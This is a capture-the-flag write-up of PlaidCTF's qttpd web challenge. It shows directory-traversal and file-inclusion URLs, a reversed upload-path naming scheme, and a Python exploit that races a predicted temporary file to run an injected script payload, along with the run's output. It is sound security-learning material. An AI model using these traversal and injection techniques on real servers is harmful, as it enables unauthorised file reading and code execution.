---
id: 237
title: 'PlaidCTF - qttpd - Pwnable Part 1 200 Point Challenge'
date: 2015-04-20T14:31:00+00:00
author: Kris
layout: post
guid: http://ctf.rip/?p=237
permalink: /plaidctf-qttpd-pwnable-part-1-200-poin/
post_views_count:
  - "526"
image: /images/2015/04/qttpdcard-2.png
categories:
  - Uncategorized
  - Write-Ups
tags:
  - "2015"
---
<div class="separator" style="clear: both; text-align: center;">
  <a href="http://2.bp.blogspot.com/--A2myZNjER8/VTSM0B0c3MI/AAAAAAAAAE0/LFYjUZktLqU/s1600/qttpdcard.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" src="/images/2015/04/qttpdcard-2.png" height="200" width="134" /></a>
</div>

Feels like such a long time from the last CTF I did! Since NDH I looked a little bit at <a href="http://ctf.exodusintel.com/" target="_blank">ExodusCTF</a> but didn't have too much luck only solving a few of the easy ones like killing the bear so nothing to really write up. So PlaidCTF was really good for me to get back into CTFing.

I started on qttpd as it was one of the earliest challenges available. It was in the Pwnable category but was a challenge in three parts with part one being more of a web challenge.

What we had was a link to a website. The website was for a fictitious travel destination with several subpages that were called using a **<span style="background-color: blue; font-family: Courier New, Courier, monospace;">page=</span>** variable given in the URL. A URL Such as **<span style="font-family: Courier New, Courier, monospace;">/?page=index</span>** would give us the home page.

<div class="separator" style="clear: both; text-align: center;">
  <a href="/images/2015/04/qt2-2.png" imageanchor="1" style="clear: right; float: right; margin-bottom: 1em; margin-left: 1em;"><img border="0" src="/images/2015/04/qt2-2.png" height="383" width="400" /></a>
</div>

First thoughts whenever you see a page= variable in a url is that there's probably a local file inclusion vulnerability there, so why not give that a shot? Also, since we didn't know what file to include yet we started with an empty directory traversal attempt to see if we needed to work around some input validation or something. The URL we tried first was** <span style="font-family: Courier New, Courier, monospace;">/?page=../../..</span>**

Fortunately our first guess paid off in two ways. We found minimal input validation (well none that mattered for the challenge) and actually our first attempt rewarded us by showing that the script was able to mistakenly open a directory as a file and give us some binary data showing the files and folders that exist within the webservers filesystem,

You can see an example below:

<div class="separator" style="clear: both; text-align: center;">
  <a href="/images/2015/04/qt3-2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="/images/2015/04/qt3-2.png" width="550" /></a>
</div>

Ok, that's cool so a couple of interesting items here, flags for one. We tried to get those using the directory traversal / file include but no luck so that might just be a red herring for now. Let's look at the other files here. Looks like:

  * .
  * ..
  * httpd.conf
  * httpd.stripped
  * .profile
  * lastlogin
  * errors
  * uploads
  * www
  * includes
  * flag1/2/3.jpg

Some folders probably, some files too, if we can get that <i>httpd.stripped</i> and <i>httpd.conf</i> we can know more about the environment we're targeting. Let's try and get them...

<div class="separator" style="clear: both; text-align: center;">
  <a href="/images/2015/04/qt5a-2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="/images/2015/04/qt5a-2.png" width="550" /></a>
</div>



<div class="separator" style="clear: both; text-align: center;">
  <a href="/images/2015/04/qt5b-2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="/images/2015/04/qt5b-2.png" width="550" /></a>
</div>

Cool, we learned a little there, chroot environment, the uploads folder we sort of already knew about, timeout values, flag folders that we couldn't access. What about the binary:</p> 
  
<div class="separator" style="clear: both; text-align: center;">
  <a href="/images/2015/04/qt6b-2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="/images/2015/04/qt6b-2.png" width="550" /></a>
</div>

Ok sweet. using this URL we could download the binary, we did this using wget on a Kali box and edited the extra html junk out to recover the ELF file. We'll check that a bit later. In the meantime let's keep probing around the filesystem.

After a little more probing we start to find less and less of interest. The includes/ folder was not directly readable like the root folder was so we have less and less to go on. I decided to start switching over to the local file inclusion part of this testing phase.

One of the first things I try is to include the index file itself. I had already learnt during my testing so far that this site uses SHTML file extensions on all the pages. This is divulged in the error messages such as: <i>File not found (../pages/../includes/.shtml) .</i>What happens if i ask the server to include itself in its index.shtml output?

<div class="separator" style="clear: both; text-align: center;">
    <a href="/images/2015/04/qt10-2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="/images/2015/04/qt10-2.png" width="550" /></a>
  </div>

Cool! We get the source code of the service side script including details about something called a SCRIPT_EXT and a path to other juicy loot. "../includes/base.inc". Let's read that if we can:

<b>/?page=../includes/base.inc</b> output:


<div class="separator" style="clear: both; text-align: center;">
    <a href="/images/2015/04/qt7-2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="/images/2015/04/qt7-2.png" width="550" /></a>
</div>

And one more file we can read from that, <b>../includes/error.inc</b>, whats that?:

<div class="separator" style="clear: both; text-align: center;">
    <a href="/images/2015/04/qt11-2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="/images/2015/04/qt11-2.png" height="36" width="400" /></a>
  </div>

Ok so now we're beginning to form the basis of our attack, let's combine what we found out.

<ol>
    <li>
      We found that there exists a variable SCRIPT_EXT and if we can control this we can control the extension of the file considered to be a script for execution
    </li>
    <li>
      We can traverse the directories and read any file within the chroot environment as long as we know the exact path to it.
    </li>
    <li>
      We're beginning to learn something about a file in POST_PATH? What's that all about? We'll learn later.
    </li>
    <li>
      We see that if we can invoke an error and have DEBUG set to on, we can get the system to call a function called var_dump()? Sounds promising.
    </li>
  </ol>


Let's look into that last one first. It seems logical that to get error.inc to run we can just call in directly right? We'll need to use that SCRIPT_EXT variable to get this trick to work:


<b>/?page=../includes/error&SCRIPT_EXT=.inc</b>

This reveals nothing in the page itself but when we view source we see the error message. So that confirms we can control variables in the scripting language from the GET request:

  <div class="separator" style="clear: both; text-align: center;">
    <a href="/images/2015/04/qt12-2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="/images/2015/04/qt12-2.png" /></a>
  </div>

And what about with DEBUG turned on?

  <div class="separator" style="clear: both; text-align: center;">
    <a href="/images/2015/04/qt13-2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="/images/2015/04/qt13-2.png" width="550" /></a>
  </div>

Cool stuff but not everything we need yet. We need to switch to a POST query and probably something of type "application/x-www-form-urlencoded" which we learned about in the "base.inc" file. From here I switch to using curl in my Kali box:

```
 root@mankrik:~/plaid/qttp# curl -i -s -k -X 'POST'   
 >     -H 'Referer: http://107.189.94.253/?page=contact'   
 >     -H 'Content-Type: application/x-www-form-urlencoded'   
 >     --data-binary $'name=r&email=r&subject=r'   
 >     'http://107.189.94.253/?page=../www/index&DEBUG=on'  
```
    
```
 <!-- POST_PATH = /uploads/E713E9DC16497//data1d2fc014.0 -->  
 <!-- QUERY_STRING = page=../www/index&DEBUG=on -->  
 <!-- REQUEST_URI = / -->  
 <!-- path = ../pages/../www/index.shtml -->  
 <!-- DEBUG = on -->  
 <!-- HTTP_CONTENT_TYPE = application/x-www-form-urlencoded -->  
 <!-- page = ../www/index -->  
 <!-- SCRIPT_EXT = .shtml -->  
 <!-- subject = r -->  
 <!-- HTTP_USER_AGENT = curl/7.26.0 -->  
 <!-- METHOD = POST -->  
 <!-- HTTP_REFERER = http://107.189.94.253/?page=contact -->  
 <!-- name = r -->  
 <!-- HTTP_HOST = 107.189.94.253 -->  
 <!-- HTTP_ACCEPT = */* -->  
 <!-- POST_LENGTH = 40 -->  
 <!-- VERSION = HTTP/1.1 -->  
 <!-- REMOTE_IP = ::ffff: -->  
 <!-- HTTP_CONTENT_LENGTH = 40 -->  
 <!-- email = r -->  
```

Ok look at that, seems like there's that POST_PATH variable we read about. Let's see, can we just browse to that folder and look at our contents?

<i><b>File not found (../pages/../uploads/E713E9DC16497//data1d2fc014.0)</b></i><br /> <i><br /></i><br /> Nope. In fact, in my testing I was unable to ever get directly to this file once I learned about it's name. If the file was stored on the server any length of time I think it must be a few seconds at the most.

Let's learn about how this filename is created? For that we switch to the <i>httpd.stripped</i> binary we downloaded earlier. A little reversing gives us the following part of a function:

```
   post_path_folder = (char *)v15;  
   clock_gettime(2, &tp);  
   sprintf(  
    post_path_folder,  
    "%s/%08X%llX/",  
    *(_DWORD *)(v5 + 28),  
    *(_DWORD *)(v4 + 28),  
    (unsigned int)(1000 * tp.tv_sec + tp.tv_nsec / 1000000) / 0x3E8uLL);  
   mkdir(post_path_folder, 0x1E9u);  
   *(_DWORD *)(v4 + 60) = post_path_folder;  
   post_path_data_filename = tempnam(post_path_folder, "data");  
   *(_DWORD *)(v4 + 64) = post_path_data_filename;  
```
 
So the upload path name is a function of the current time plus whatever the <a href="http://man7.org/linux/man-pages/man3/tempnam.3.html" target="_blank">tempnam(3)</a> function comes up with. The timing of the naming scheme isn't very fine though, so quite predictable. Great!

So in order to attack this I decided to stop trying to access folders we knew existed in the past but to predict what folder will exist during my next call and call for it at the same time I create it. We might not hit it exactly so trial and error might be needed.

So what? Why attack this folder at all?

Well so far we've not come across much in the way of useful files to include as vectors for injecting commands. We know there's a server side scripting language but we don't have any way thus far to perform command injection.

Along the way we tried various methods of injecting data. The contact form for example was a nice distraction but ultimately proved useless for injection.

The theory we've been building on is based on some learnings from reversing the httpd.stripped binary. What it seems to do is take the POST payload data and store it in this POST_PATH data file for processing.

This gives us an injection vector, however brief, where we can control data stored on the server.

So this is the overview of the attack we plan:

<ul>
      <li>
        Send a POST query, gather intel about the current POST_PATH on the server
      </li>
      <li>
        Based on the return value, guess what the POST_PATH will be in a few seconds from now
      </li>
      <li>
        Build a weaponised payload with script commands
      </li>
      <li>
        Repeatedly query our guessed POST_PATH using the correct SCRIPT_EXT to enable execution until it works
      </li>
    </ul>

We have everything we need now except a weaponised payload. We need to learn about the scripting language used. For this we use what we know from the example source code we've seen so far in base.inc, error.inc and index.shtml:

<ul>
        <li>
          Script commands are enclosed in <span style="font-family: Courier New, Courier, monospace;"><@ @></span> and commands are terminated with semicolons
        </li>
        <li>
          There's <span style="font-family: Courier New, Courier, monospace;">var_dump, echo, print, read_file, sendfile, include_file</span>, functions used in the code
        </li>
      </ul>

We add to that the following we see when we disassemble the location of the from reversing the httpd.stripped binary:

```
.text:0804D08D loc_804D08D:              ; CODE XREF: sub_804C600+A74 j  
 .text:0804D08D         lea   eax, [ebp+var_3A8]  
 .text:0804D093         lea   edx, [ebp+var_60]  
 .text:0804D096         mov   [esp+0Ch], eax ; int  
 .text:0804D09A         mov   dword ptr [esp+8], offset sub_804C1E0 ; int  
 .text:0804D0A2         mov   dword ptr [esp+4], offset aEcho ; "echo"  
 .text:0804D0AA         mov   [esp], edx   ; int  
 .text:0804D0AD         call  sub_8051A00  
 .text:0804D0B2         test  eax, eax  
 .text:0804D0B4         jz   short loc_804D076  
 .text:0804D0B6         lea   eax, [ebp+var_60]  
 .text:0804D0B9         lea   edi, [ebp+var_3A8]  
 .text:0804D0BF         mov   [esp+0Ch], edi ; int  
 .text:0804D0C3         mov   dword ptr [esp+8], offset sub_804BFC0 ; int  
 .text:0804D0CB         mov   dword ptr [esp+4], offset aVar_dump ; "var_dump"  
 ... cut ...
 .text:0804D173         mov   dword ptr [esp+8], offset sub_804BD50 ; int  
 .text:0804D17B         mov   dword ptr [esp+4], offset aGet_flag ; "<b><u>get_flag</u></b>"  
 .text:0804D183         mov   [esp], edi   ; int  
 .text:0804D186         call  sub_8051A00  
 .text:0804D18B         mov   [ebp+var_4DC], 0  
 .text:0804D195         test  eax, eax  
 .text:0804D197         jz   loc_804D076  
 .text:0804D19D         mov   [ebp+var_4E8], ebx  
```

So there's also a "<span style="background-color: blue;">get_flag</span>" function. Sweet!

So after some trial and error, our weaponised payload command is going to be:

<ul>
          <li>
            <span style="font-family: Courier New, Courier, monospace;"><@ echo(get_flag()); @></span>
          </li>
        </ul>

And to apply all that we've learned I put together the following rushed python exploit:

```
 #!/usr/bin/python  
 import requests  

 headers = {'Content-type': 'application/x-www-form-urlencoded'}  
 payload = '<@ echo(get_flag()); @>'   
 # get current server information by generating an error.  
 print "[+] Fetching POST_PATH ... "  
 s = requests.Session()  
 r = s.post('http://107.189.94.253/?page=../../includes/error&SCRIPT_EXT=.inc&DEBUG=on',data=payload,headers=headers)   
 # parse the post_path  
 response = r.text.splitlines()  
 for line in response:  
      if "POST_PATH" in line:  
           pp = line.split(" ")  
           print "[+] Post path is: " + pp[3]  
           ts = pp[3].split("/")  
           print "[+] Current timestamp: " + ts[2]  
           print "[+] Data folder: " + ts[4]  
 # predict the future  
 print "[+] Trying to predict the post data file this takes 8 seconds or so"  
 thetime = long(ts[2],16)  
 for trying in range(0,8,1):  
      trytime = thetime +3  
      strtime = hex(trytime)  
      strtime = strtime.upper()  
      strtime = strtime.replace("0X", "")  
      strtime = strtime.replace("L", "")  
      datadir = ts[4].replace(".0","")  
      guess = "/uploads/" + strtime + "//" + datadir  
      r = s.post('http://107.189.94.253/?page=..' + guess +'&SCRIPT_EXT=.0&DEBUG=on',data=payload,headers=headers)  
      response = r.text.splitlines()  
      for line in response:  
           if "flag{" in line:  
                print "[+] Flag: " + line  
                quit()  
```

Which when run gives us the following flag:

```
 root@mankrik:~/plaid/qttp# ./qtpwner.py   
 [+] Fetching POST_PATH ...   
 [+] Post path is: /uploads/E713E9DC1654F//data1d2fc014.0  
 [+] Current timestamp: E713E9DC1654F  
 [+] Data folder: data1d2fc014.0  
 [+] Trying to predict the post data file this takes 8 seconds or so  
 [+] Flag: flag{1down_2togo_hint_650sp1}  
```

What a fun one and 200 points in the bank!

Writeup: Dacat